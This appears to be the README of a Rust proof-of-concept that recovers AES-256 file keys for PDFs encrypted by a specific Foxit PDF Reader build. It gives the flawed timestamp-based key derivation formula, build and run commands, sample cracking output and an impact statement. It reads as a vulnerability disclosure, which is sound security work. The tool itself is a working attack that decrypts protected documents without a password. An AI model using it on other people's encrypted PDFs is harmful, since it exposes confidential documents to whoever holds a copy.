# Foxit PDF AES-256 key recovery

Foxit PDF Reader 2026.1.3.36551 for Windows x64 derives PDF file-encryption keys from a Unix timestamp:

```text
SHA-256(uint32_le(time(NULL)) || zeroes(32) || "there")
```

The only variable input is the 32-bit timestamp. The public `/Perms` block provides known plaintext that lets the included Rust cracker test candidate timestamps without a password or full-document decryption. After finding the key, it writes an unencrypted PDF.

The cracker supports both affected Foxit modes:

- PDF revision 6 with `/CFM /AESV3` (AES-256-CBC)
- PDF revision 7 with `/CFM /AESV4` (AES-256-GCM)

## Build

Install a current Rust toolchain, then build the release binary:

```bash
cargo build --release
```

## Usage

```bash
./target/release/foxit-decrypt protected.pdf decrypted.pdf
```

The search starts one day in the future and proceeds backward to the Unix epoch using all Rayon worker threads. Recent documents are found first.

Example output:

```text
searching downward from 1793203504 (2026-10-28T16:05:04+00:00) with 32 threads
found timestamp 1787583328 (2026-08-24T14:55:28+00:00) after testing 5569908 candidates in 0.025s (226.935 million/s)
wrote /tmp/foxit-aesv3-decrypted.pdf
```

## Impact

Anyone with an affected PDF can recover its AES-256 file key and decrypt it without either the user or owner password. The timestamp space contains at most $2^{32}$ candidates and is much smaller when the document's approximate creation time is known.

The tested build produced both AES-256-CBC and AES-256-GCM documents with this key derivation.
